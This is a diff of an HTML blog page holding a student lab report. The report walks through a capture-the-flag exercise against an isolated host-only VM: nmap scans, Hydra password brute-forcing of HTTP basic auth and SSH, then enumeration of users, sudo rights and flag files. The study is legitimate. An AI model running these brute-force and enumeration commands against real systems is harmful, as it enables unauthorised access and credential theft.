@@ -1,86 +1,24 @@
 <!DOCTYPE html>
 <html lang="en" dir="auto">
 
-<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=39857&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="robots" content="noindex, nofollow">
-<title>Babys first CTF | silly blog</title>
-<meta name="keywords" content="linux, it sec, school, red team, ctf">
-<meta name="description" content="
-Note: this was converted from LaTeX to Markdown using ChatGPT 4.1. The original PDF can be found here along with the bibliography.
-
-
-Ethical hacking of a CTF-VM
-
-Laboratory protocol
-Exercise 7: Ethical hacking of a CTF-VM
-
-     
-            Figure: Grouplogo
-        
-
-
-Subject: ITSI
-Class: 3AHITN
-Name: Stefan Fürst, Justin Tremurici
-Group Name/Number: todo/12
-Supervisor: SPAC, ZIVK
-Exercise dates: 17-19.1.2025
-Submission date: 20.1.2025
-
-Table of Contents
-
-Task definition
-Summary
-Complete network topology of the exercise
-Exercise Execution
-
-Setting up the virtual machines
-Reconnaissance: Scanning the Network
-Reconnaissance: Exploring the websites
-Weaponization: Evaluating the needed tools
-Exploitation: Using Hydra to break HTTP basic authentication
-Exploitation: Using Hydra to brute force SSH login
-Exploring the system
-
-Listing all the files
-Investigating the listening service
-Investigating the process flag
-Further investigating the webserver
-Investigating secret_flag.txt
-Exploring the new user
-Finding the history flag
-
-
-It should be over now, right?
-Privilege escalation on Linux
-
-Using a smart enumeration tool
-Trying a kernel level exploit
-Trying to get privileges using Metasploit and Meterpreter
-
-
-Getting root access through editing the GRUB boot options
-Obtaining the final flag
-
-
-References
-
-
-Task definition
-This task is based on a Capture the Flag (CTF) challenge, where multiple flags are hidden across an environment and can be found either through exploits or by navigating the system. Two virtual machines are provided: an Ubuntu server, which hosts the flags, and a Kali Linux machine for offensive actions. Both machines operate in a Host-only network, meaning they can communicate with each other but not with the external internet or other devices.">
+<title>Baby&#39;s First CTF | veya&#39;s silly little website</title>
+<meta name="keywords" content="linux, it-sec, school, red-team, ctf">
+<meta name="description" content="A documented CTF walkthrough covering network discovery, service enumeration, credential attacks, and Linux exploitation.">
 <meta name="author" content="veya">
-<link rel="canonical" href="http://localhost:39857/posts/itsi/year-3/exercise-7/babys-first-ctf/">
-<link crossorigin="anonymous" href="/assets/css/stylesheet.f49d66caae9ea0fd43f21f29e71a8d3e284517ed770f2aa86fa012953ad3c9ef.css" integrity="sha256-9J1myq6eoP1D8h8p5xqNPihFF&#43;13Dyqob6ASlTrTye8=" rel="preload stylesheet" as="style">
-<link rel="icon" href="http://localhost:39857/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:39857/favicon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:39857/favicon-32x32.png">
-<link rel="apple-touch-icon" href="http://localhost:39857/apple-touch-icon.png">
-<link rel="mask-icon" href="http://localhost:39857/safari-pinned-tab.svg">
-<meta name="theme-color" content="#2e2e33">
+<link rel="canonical" href="http://localhost:1313/posts/itsi/year-3/exercise-7/babys-first-ctf/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.f22caeb8fa017ba8a722900a376f8b736adeb3549e2aeca3cc9f292a3cdf6e9e.css" integrity="sha256-8iyuuPoBe6inIpAKN2&#43;Lc2res1SeKuyjzJ8pKjzfbp4=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://raw.githubusercontent.com/0xveya/goobering/master/website/assets/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://raw.githubusercontent.com/0xveya/goobering/master/website/assets/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://raw.githubusercontent.com/0xveya/goobering/master/website/assets/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://raw.githubusercontent.com/0xveya/goobering/master/website/assets/apple-touch-icon.png">
+<link rel="mask-icon" href="https://raw.githubusercontent.com/0xveya/goobering/master/website/assets/safari-pinned-tab.svg">
+<meta name="theme-color" content="#080808">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="http://localhost:39857/posts/itsi/year-3/exercise-7/babys-first-ctf/">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/itsi/year-3/exercise-7/babys-first-ctf/">
 <noscript>
     <style>
         #theme-toggle,
@@ -135,7 +73,7 @@ This task is based on a Capture the Flag (CTF) challenge, where multiple flags a
 <header class="header">
     <nav class="nav">
         <div class="logo">
-            <a href="http://localhost:39857/" accesskey="h" title="silly blog (Alt + H)">silly blog</a>
+            <a href="http://localhost:1313/" accesskey="h" title="veya&#39;s silly little website (Alt + H)">veya&#39;s silly little website</a>
             <div class="logo-switches">
                 <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                     <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
@@ -161,17 +99,22 @@ This task is based on a Capture the Flag (CTF) challenge, where multiple flags a
         </div>
         <ul id="menu">
             <li>
-                <a href="http://localhost:39857/about/" title="About">
+                <a href="http://localhost:1313/about/" title="About">
                     <span>About</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:39857/posts/" title="Posts">
+                <a href="http://localhost:1313/networking-security/" title="Networking &amp; Security">
+                    <span>Networking &amp; Security</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/posts/" title="Posts">
                     <span>Posts</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:39857/" title="root">
+                <a href="http://localhost:1313/" title="root">
                     <span>root</span>
                 </a>
             </li>
@@ -184,14 +127,17 @@ This task is based on a Capture the Flag (CTF) challenge, where multiple flags a
   <header class="post-header">
     
     <h1 class="post-title entry-hint-parent">
-      Babys first CTF
+      Baby&#39;s First CTF
     </h1>
+    <div class="post-description">
+      A documented CTF walkthrough covering network discovery, service enumeration, credential attacks, and Linux exploitation.
+    </div>
     <div class="post-meta"><span title='2025-01-20 03:33:09 +0100 CET'>January 20, 2025</span>&nbsp;·&nbsp;17 min&nbsp;·&nbsp;veya
 
 </div>
   </header> 
   <div class="post-content"><blockquote>
-<p>Note: this was converted from LaTeX to Markdown using ChatGPT 4.1. The original PDF can be found <a href="https://github.com/Stefanistkuhl/goobering/blob/master/itsi/y3/ex7/UE7_CTF.pdf">here</a> along with the <a href="https://github.com/Stefanistkuhl/goobering/blob/master/itsi/y3/ex7/quellen.bib">bibliography</a>.</p>
+<p>This is an HTL Donaustadt laboratory report converted from the original document. The <a href="https://github.com/0xveya/goobering/blob/master/itsi/y3/ex7/UE7_CTF.pdf">original PDF</a> and <a href="https://github.com/0xveya/goobering/blob/master/itsi/y3/ex7/quellen.bib">bibliography</a> are available on GitHub.</p>
 </blockquote>
 <hr>
 <h1 id="ethical-hacking-of-a-ctf-vm">Ethical hacking of a CTF-VM<a hidden class="anchor" aria-hidden="true" href="#ethical-hacking-of-a-ctf-vm">#</a></h1>
@@ -199,15 +145,14 @@ This task is based on a Capture the Flag (CTF) challenge, where multiple flags a
 <p><strong>Laboratory protocol</strong><br>
 Exercise 7: Ethical hacking of a CTF-VM<br>
 <figure>
-    <img loading="lazy" src="/itsi/y3/ex7/images/menheraMagnifier.png"/> <figcaption>
-            Figure: Grouplogo
+    <img loading="lazy" src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/menheraMagnifier.png"/> <figcaption>
+            Original report cover image
         </figcaption>
 </figure>
 
 <strong>Subject:</strong> ITSI<br>
 <strong>Class:</strong> 3AHITN<br>
-<strong>Name:</strong> Stefan Fürst, Justin Tremurici<br>
-<strong>Group Name/Number:</strong> todo/12<br>
+<strong>Name:</strong> Veya Fürst, Justin Tremurici<br>
 <strong>Supervisor:</strong> SPAC, ZIVK<br>
 <strong>Exercise dates:</strong> 17-19.1.2025<br>
 <strong>Submission date:</strong> 20.1.2025</p>
@@ -262,7 +207,7 @@ Exercise 7: Ethical hacking of a CTF-VM<br>
 <hr>
 <h2 id="complete-network-topology-of-the-exercise">Complete network topology of the exercise<a hidden class="anchor" aria-hidden="true" href="#complete-network-topology-of-the-exercise">#</a></h2>
 <figure>
-    <img loading="lazy" src="/itsi/y3/ex7/images/topo.png"/> <figcaption>
+    <img loading="lazy" src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/topo.png"/> <figcaption>
             Figure 1: Complete network topology of the exercise
         </figcaption>
 </figure>
@@ -272,21 +217,21 @@ Exercise 7: Ethical hacking of a CTF-VM<br>
 <h3 id="setting-up-the-virtual-machines">Setting up the virtual machines<a hidden class="anchor" aria-hidden="true" href="#setting-up-the-virtual-machines">#</a></h3>
 <p>To get started with this CTF, make sure that VirtualBox version 7.1.4 is used. The VM to attack must be imported by double-clicking the provided <code>.ova</code> file. After the import is complete, the network settings must be changed to use Host-only Adapter mode. Since using the default Host-only network did not work, we had to create a new Host-only network. To do this, either press <code>&lt;C-h&gt;</code> or click on <code>File &gt; Tools &gt; Network Manager</code>, as shown in Figure 2.</p>
 <figure>
-    <img loading="lazy" src="/itsi/y3/ex7/images/openingNetworkManager.png"/> <figcaption>
+    <img loading="lazy" src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/openingNetworkManager.png"/> <figcaption>
             Figure 2: Opening VirtualBox Network Manager settings
         </figcaption>
 </figure>
 
 <p>In this menu, click on <code>Create</code>, then check the <code>Enable Server</code> box to enable the DHCP server so the target VM will receive an IP address. Then, click on <code>Adapter</code> to view the IP range of the network, which in our case is <code>192.168.15.0/24</code>, which can be seen in Figure 3.</p>
 <figure>
-    <img loading="lazy" src="/itsi/y3/ex7/images/nwipsfr.png"/> <figcaption>
+    <img loading="lazy" src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/nwipsfr.png"/> <figcaption>
             Figure 3: Showing the IP settings for the new Host-only network
         </figcaption>
 </figure>
 
 <p>Next, open the virtual machine settings by selecting the VM in the list and pressing <code>&lt;C-s&gt;</code>. Under the <code>Network</code> section, change the network adapter to use the Host-only Adapter and select the VirtualBox Host-only Ethernet Adapter #2, which was just created. Perform this step for both the target VM and the Kali VM, as detailed in Figure 4.</p>
 <figure>
-    <img loading="lazy" src="/itsi/y3/ex7/images/vmnwconf.png"/> <figcaption>
+    <img loading="lazy" src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/vmnwconf.png"/> <figcaption>
             Figure 4: Showing the network configuration of the virtual machines
         </figcaption>
 </figure>
@@ -295,7 +240,7 @@ Exercise 7: Ethical hacking of a CTF-VM<br>
 <h3 id="reconnaissance-scanning-the-network">Reconnaissance: Scanning the Network<a hidden class="anchor" aria-hidden="true" href="#reconnaissance-scanning-the-network">#</a></h3>
 <p>We use the Cyber Kill Chain to structure our steps for completing the CTF, with any attack beginning with reconnaissance, which in this case means scanning the network with <code>nmap</code>.<cite>Lockheed Martin<sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup></cite> Since we don&rsquo;t know the IP address of the target server yet, we need to scan the network to find it. For this, the command <code>nmap 192.168.15.0/24</code> is used to scan the entire network for open ports, as illustrated in Figure 5.</p>
 <figure>
-    <img loading="lazy" src="/itsi/y3/ex7/images/firstnmapscan.png"/> <figcaption>
+    <img loading="lazy" src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/firstnmapscan.png"/> <figcaption>
             Figure 5: Results of the nmap scan
         </figcaption>
 </figure>
@@ -303,7 +248,7 @@ Exercise 7: Ethical hacking of a CTF-VM<br>
 <p>We can determine that the target has the IP address <code>192.168.15.3</code>, since <code>.1</code> is the network address, <code>.2</code> is the DHCP server, and <code>.4</code> is the IP address of the Kali VM. This can be verified by running <code>ip a</code> or by scanning the open ports, since <code>ssh</code> is not exposed.</p>
 <p>Now we can run another <code>nmap</code> scan to get further information about the running services and their version by using the <code>-sV</code> flag and the <code>-T4</code> flag for aggressive timing, and the <code>-p-</code> value to scan all ports.<cite>Nmap Version Detection<sup id="fnref:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup></cite><cite>Nmap Timing<sup id="fnref:4"><a href="#fn:4" class="footnote-ref" role="doc-noteref">4</a></sup></cite> The results of the scan can be seen in Figure 6.</p>
 <figure>
-    <img loading="lazy" src="/itsi/y3/ex7/images/nmapfr.png"/> <figcaption>
+    <img loading="lazy" src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/nmapfr.png"/> <figcaption>
             Figure 6: Results of the detailed nmap scan
         </figcaption>
 </figure>
@@ -313,34 +258,34 @@ Exercise 7: Ethical hacking of a CTF-VM<br>
 <h3 id="reconnaissance-exploring-the-websites">Reconnaissance: Exploring the websites<a hidden class="anchor" aria-hidden="true" href="#reconnaissance-exploring-the-websites">#</a></h3>
 <p>If we open the websites in our web browser of choice, we can see that the one on port <code>1080</code> says that to get further, we need to scan deeper, which we already did. The website on port <code>5155</code> shows text from foreign languages, which is randomized and always prints out different text on refresh. The site on port <code>10458</code> prints out a message in <code>base64</code>, and lastly, the one on port <code>10448</code> has a basic authentication login prompt for a mini web shell. Figure 7 shows the content of each webpage.</p>
 <figure>
-    <img loading="lazy" src="/itsi/y3/ex7/images/allesiten.png"/> <figcaption>
+    <img loading="lazy" src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/allesiten.png"/> <figcaption>
             Figure 7: Showing the contents of each page using curl
         </figcaption>
 </figure>
 
 <p>The <code>base64</code> message can be decoded by piping the string, using <code>echo</code>, into the <code>base64</code> command, which gives us the hint to use port <code>55487</code>, the site with authentication. This is shown in Figure 8.</p>
 <figure>
-    <img loading="lazy" src="/itsi/y3/ex7/images/base64.png"/> <figcaption>
+    <img loading="lazy" src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/base64.png"/> <figcaption>
             Figure 8: Decoding the base64 message
         </figcaption>
 </figure>
 
 <p>To get all the random variants from the site with the foreign languages, I wrote a quick batch script to recursively relay the website and save the output in a file called <code>output</code>, as shown in Figure 9.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">while</span> true;<span style="color:#66d9ef">do</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> true;<span style="color:#66d9ef">do</span>
 </span></span><span style="display:flex;"><span>    body<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>curl -s 192.168.15:5155<span style="color:#66d9ef">)</span>
 </span></span><span style="display:flex;"><span>    echo <span style="color:#e6db74">&#34;</span>$body<span style="color:#e6db74">&#34;</span> &gt;&gt; output
 </span></span><span style="display:flex;"><span>    echo <span style="color:#e6db74">&#34;</span>$body<span style="color:#e6db74">&#34;</span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
 </span></span></code></pre></div><figure>
-    <img loading="lazy" src="/itsi/y3/ex7/images/gettextsh.png"/> <figcaption>
+    <img loading="lazy" src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/gettextsh.png"/> <figcaption>
             Figure 9: Running the script
         </figcaption>
 </figure>
 
 <p>After running it for a while, we prompted ChatGPT with the list of outputs to translate, which revealed the following hint, as shown in Figure 10.</p>
 <figure>
-    <img loading="lazy" src="/itsi/y3/ex7/images/labngs.png"/> <figcaption>
+    <img loading="lazy" src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/labngs.png"/> <figcaption>
             Figure 10: ChatGPT translating the hint
         </figcaption>
 </figure>
@@ -351,21 +296,21 @@ Exercise 7: Ethical hacking of a CTF-VM<br>
 <hr>
 <h3 id="exploitation-using-hydra-to-break-http-basic-authentication">Exploitation: Using Hydra to break HTTP basic authentication<a hidden class="anchor" aria-hidden="true" href="#exploitation-using-hydra-to-break-http-basic-authentication">#</a></h3>
 <p>To brute force the password, the following <code>hydra</code> command will be used: <code>hydra -l user -P pw.txt -s 55487 -f 192.168.15.3 http-get /</code><cite>hydra-http-basic-auth<sup id="fnref:6"><a href="#fn:6" class="footnote-ref" role="doc-noteref">6</a></sup></cite></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>-l user <span style="color:#75715e">#specifying the username to attempt logging in with</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>-l user <span style="color:#75715e">#specifying the username to attempt logging in with</span>
 </span></span><span style="display:flex;"><span>-P pw.txt <span style="color:#75715e">#tells Hydra to use the contents of pw.txt as passwords to try</span>
 </span></span><span style="display:flex;"><span>-s <span style="color:#ae81ff">55487</span> <span style="color:#75715e">#specifying the port to connect to</span>
 </span></span><span style="display:flex;"><span>-f <span style="color:#75715e">#telling Hydra to stop after a valid login</span>
 </span></span><span style="display:flex;"><span>192.168.15.3 <span style="color:#75715e">#setting the target IP address</span>
 </span></span><span style="display:flex;"><span>http-get / <span style="color:#75715e">#specifying the service and method to use</span>
 </span></span></code></pre></div><figure>
-    <img loading="lazy" src="/itsi/y3/ex7/images/hydra.png"/> <figcaption>
+    <img loading="lazy" src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/hydra.png"/> <figcaption>
             Figure 11: Running the Hydra command to get the credentials
         </figcaption>
 </figure>
 
 <p>After entering the found credentials on the webpage, we get the first flag.</p>
 <figure>
-    <img loading="lazy" src="/itsi/y3/ex7/images/flag1.png"/> <figcaption>
+    <img loading="lazy" src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/flag1.png"/> <figcaption>
             Figure 12: First flag found
         </figcaption>
 </figure>
@@ -376,7 +321,7 @@ Exercise 7: Ethical hacking of a CTF-VM<br>
 <h3 id="exploitation-using-hydra-to-brute-force-ssh-login">Exploitation: Using Hydra to brute force SSH login<a hidden class="anchor" aria-hidden="true" href="#exploitation-using-hydra-to-brute-force-ssh-login">#</a></h3>
 <p>To brute force the SSH login, this Hydra command is used: <code>hydra -l GrumpyCat -P pw.txt 192.168.15.3 ssh -t 4</code>.<cite>hydra-ssh<sup id="fnref:7"><a href="#fn:7" class="footnote-ref" role="doc-noteref">7</a></sup></cite> The only changes made to the command are the username we got through the webshell, replacing the method with SSH, and using the <code>-t</code> flag with a value of 4 to set the max tasks to 4, since some SSH configurations tend to block higher counts. Figure 13 shows the command output.</p>
 <figure>
-    <img loading="lazy" src="/itsi/y3/ex7/images/hydrassh.png"/> <figcaption>
+    <img loading="lazy" src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/hydrassh.png"/> <figcaption>
             Figure 13: Getting the credentials for the user GrumpyCat
         </figcaption>
 </figure>
@@ -386,14 +331,14 @@ Exercise 7: Ethical hacking of a CTF-VM<br>
 <h4 id="listing-all-the-files">Listing all the files<a hidden class="anchor" aria-hidden="true" href="#listing-all-the-files">#</a></h4>
 <p>Now that we have a shell in the server, it&rsquo;s time to dig around and explore. We started by running <code>ls -R / * 2&gt;/dev/null | grep flag</code>, in which the <code>-R</code> flag is used to recursively list all the files in the root of the file system and the <code>*</code> is used to list everything inside that as well. Lastly, the <code>2&gt;/dev/null</code> redirects <code>stderr</code> to the file <code>/dev/null</code> to effectively delete them from the output, which is piped into <code>grep</code> to filter it to search for files that have <code>flag</code> in their name.<cite>stderr<sup id="fnref:8"><a href="#fn:8" class="footnote-ref" role="doc-noteref">8</a></sup></cite> To tidy up the output, it can be piped into <code>grep</code> again with the <code>-v</code> flag to exclude results that contain <code>flags</code>. Figure 14 shows the results.</p>
 <figure>
-    <img loading="lazy" src="/itsi/y3/ex7/images/searchingfor%20falgfiles.png"/> <figcaption>
+    <img loading="lazy" src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/searchingfor%20falgfiles.png"/> <figcaption>
             Figure 14: Output of the search command
         </figcaption>
 </figure>
 
 <p>As we can see, we found a file called <code>secret_flag.txt</code> and <code>flag_process.sh</code>, for which we can search with the following command: <code>find -name &quot;filename&quot; / 2&gt;/dev/null</code>. Figure 15 displays the found file locations.</p>
 <figure>
-    <img loading="lazy" src="/itsi/y3/ex7/images/findfiles.png"/> <figcaption>
+    <img loading="lazy" src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/findfiles.png"/> <figcaption>
             Figure 15: File locations of the 2 found files
         </figcaption>
 </figure>
@@ -402,7 +347,7 @@ Exercise 7: Ethical hacking of a CTF-VM<br>
 <h4 id="investigating-the-listening-service">Investigating the listening service<a hidden class="anchor" aria-hidden="true" href="#investigating-the-listening-service">#</a></h4>
 <p>With <code>ss -tulnp</code>, we can examine all listening process services on the system for TCP and UDP, along with the processes they use, if we have permission to see that.</p>
 <figure>
-    <img loading="lazy" src="/itsi/y3/ex7/images/sstunlp.png"/> <figcaption>
+    <img loading="lazy" src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/sstunlp.png"/> <figcaption>
             Figure 16: Viewing the listening services
         </figcaption>
 </figure>
@@ -411,7 +356,7 @@ Exercise 7: Ethical hacking of a CTF-VM<br>
 <h4 id="investigating-the-process-flag">Investigating the process flag<a hidden class="anchor" aria-hidden="true" href="#investigating-the-process-flag">#</a></h4>
 <p>Let&rsquo;s return to the file <code>flag_process.sh</code> to get this flag. Simply cat the file as shown in Figure 17.</p>
 <figure>
-    <img loading="lazy" src="/itsi/y3/ex7/images/processflag.png"/> <figcaption>
+    <img loading="lazy" src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/processflag.png"/> <figcaption>
             Figure 17: Viewing the check_running_processes flag
         </figcaption>
 </figure>
@@ -420,14 +365,14 @@ Exercise 7: Ethical hacking of a CTF-VM<br>
 <h4 id="further-investigating-the-webserver">Further investigating the webserver<a hidden class="anchor" aria-hidden="true" href="#further-investigating-the-webserver">#</a></h4>
 <p>Luckily, as seen in Figure 16, it appears that the webserver has been started as the current user, which we can further inspect with <code>ps aux | grep python</code>. As shown in Figure 18, the process has been started by the root user as GrumpyCat.</p>
 <figure>
-    <img loading="lazy" src="/itsi/y3/ex7/images/psauxpy.png"/> <figcaption>
+    <img loading="lazy" src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/psauxpy.png"/> <figcaption>
             Figure 18: Inspecting the running Python processes
         </figcaption>
 </figure>
 
 <p>If we read the file <code>/bin/ctf_server.py</code>, we first see that the ranges of the randomized port ranges are <code>4000-5600</code>, <code>10000-12000</code>, and <code>50000-60000</code>. The intended translation is &ldquo;Hinweis1: Der Nutzername lautet user&rdquo;, and lastly, a flag hides itself at the bottom of the file, which is shown in Figure 19.</p>
 <figure>
-    <img loading="lazy" src="/itsi/y3/ex7/images/commentflag.png"/> <figcaption>
+    <img loading="lazy" src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/commentflag.png"/> <figcaption>
             Figure 19: Viewing the flag in the server Python file
         </figcaption>
 </figure>
@@ -437,21 +382,21 @@ Exercise 7: Ethical hacking of a CTF-VM<br>
 <p>If we simply cat this file as the current user, we can&rsquo;t do that since we lack permission and are not in the sudoers group or file. Therefore, we have two options: either find a different user who has the privileges to read the file or escalate our current privileges to become root. The first option is the more reasonable one, which we will use.</p>
 <p>To see all the users we can log into, we can search through the file using the following grep command: <code>grep -v &quot;nologin&quot; /etc/passwd</code>. With this command, we display all the lines of the <code>/etc/passwd</code> file that don&rsquo;t contain <code>nologin</code> to only display the users we can log in as.</p>
 <figure>
-    <img loading="lazy" src="/itsi/y3/ex7/images/usr.png"/> <figcaption>
+    <img loading="lazy" src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/usr.png"/> <figcaption>
             Figure 20: Listing the users we can log in as
         </figcaption>
 </figure>
 
 <p>As seen in Figure 20, we got two new options as users to log in: <code>ubuntu</code> and <code>CheerfulOtter</code>. Since we had already tried brute-forcing the root password from the very start, just in case, and the user users have not set an interactive login shell, we chose <code>CheerfulOtter</code> because the name sounds more similar to <code>GrumpyCat</code>. We also brute-forced the <code>ubuntu</code> user in the background. This was a correct assumption, as the password for the <code>CheerfulOtter</code> user was also &ldquo;password&rdquo;, and we didn&rsquo;t find the password for the <code>ubuntu</code> user, which also had its sudo permissions removed in the <code>remove_ubuntu_from_sudo()</code> function in the setup script.</p>
 <figure>
-    <img loading="lazy" src="/itsi/y3/ex7/images/cheerfulotpw.png"/> <figcaption>
+    <img loading="lazy" src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/cheerfulotpw.png"/> <figcaption>
             Figure 21: Getting the credentials for CheerfulOtter
         </figcaption>
 </figure>
 
 <p>As seen in Figure 21, we got the credentials for the CheerfulOtter user. If we log in as that user and run <code>sudo -l</code> to see what permissions we have with sudo, we can see that the only command we can run elevated is <code>/bin/cat /opt/secret_flag.txt</code>, which we need in order to find the flag, as shown in Figure 22.</p>
 <figure>
-    <img loading="lazy" src="/itsi/y3/ex7/images/sh.png"/> <figcaption>
+    <img loading="lazy" src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/sh.png"/> <figcaption>
             Figure 22: Viewing secret_flag.txt
         </figcaption>
 </figure>
@@ -459,18 +404,18 @@ Exercise 7: Ethical hacking of a CTF-VM<br>
 <hr>
 <h4 id="exploring-the-new-user">Exploring the new user<a hidden class="anchor" aria-hidden="true" href="#exploring-the-new-user">#</a></h4>
 <p>Since we are in a new user, it&rsquo;s time to rerun old commands and see if any new files can be found. Instead of using <code>ls</code> and <code>grep</code> to search, we will use the following <code>find</code> command: <code>find / -type f -name '*flag*' 2&gt;/dev/null</code>.<cite>find<sup id="fnref:9"><a href="#fn:9" class="footnote-ref" role="doc-noteref">9</a></sup></cite> Here is a breakdown of the command used in Figure 23:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / <span style="color:#75715e">#Selecting the / directory to search in</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / <span style="color:#75715e">#Selecting the / directory to search in</span>
 </span></span><span style="display:flex;"><span>-type f <span style="color:#75715e">#Restricts the command to only search files</span>
 </span></span><span style="display:flex;"><span>-name <span style="color:#e6db74">&#39;*flag*&#39;</span> <span style="color:#75715e">#Specifies that the command should only search files that contain &#34;flag&#34;</span>
 </span></span><span style="display:flex;"><span>2&gt;/dev/null <span style="color:#75715e">#Hiding errors</span>
 </span></span></code></pre></div><p><figure>
-    <img loading="lazy" src="/itsi/y3/ex7/images/fdtmp.png"/> <figcaption>
+    <img loading="lazy" src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/fdtmp.png"/> <figcaption>
             Figure 23: Output of the find command
         </figcaption>
 </figure>
 
 <figure>
-    <img loading="lazy" src="/itsi/y3/ex7/images/tmpfl.png"/> <figcaption>
+    <img loading="lazy" src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/tmpfl.png"/> <figcaption>
             Figure 24: Viewing the flag in the /tmp directory
         </figcaption>
 </figure>
@@ -479,13 +424,13 @@ Exercise 7: Ethical hacking of a CTF-VM<br>
 <h4 id="finding-the-history-flag">Finding the history flag<a hidden class="anchor" aria-hidden="true" href="#finding-the-history-flag">#</a></h4>
 <p>Additionally to the find command, I remembered reading in a CTF cheat sheet a while ago to check the command history of the user. However, I initially only checked <code>.bash_history</code> instead of the <code>.history</code> file, which contains a flag in this CTF.<cite>enumeration-walkthough<sup id="fnref:10"><a href="#fn:10" class="footnote-ref" role="doc-noteref">10</a></sup></cite> I always missed it until I ran <code>ls -l</code> as a sanity check in the home directory of CheerfulOtter and found the flag, as shown in Figures 25 and 26.</p>
 <p><figure>
-    <img loading="lazy" src="/itsi/y3/ex7/images/colsal.png"/> <figcaption>
+    <img loading="lazy" src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/colsal.png"/> <figcaption>
             Figure 25: Viewing the home directories of CheerfulOtter
         </figcaption>
 </figure>
 
 <figure>
-    <img loading="lazy" src="/itsi/y3/ex7/images/cofl.png"/> <figcaption>
+    <img loading="lazy" src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/cofl.png"/> <figcaption>
             Figure 26: Viewing the flag in the .history file
         </figcaption>
 </figure>
@@ -521,40 +466,40 @@ Exercise 7: Ethical hacking of a CTF-VM<br>
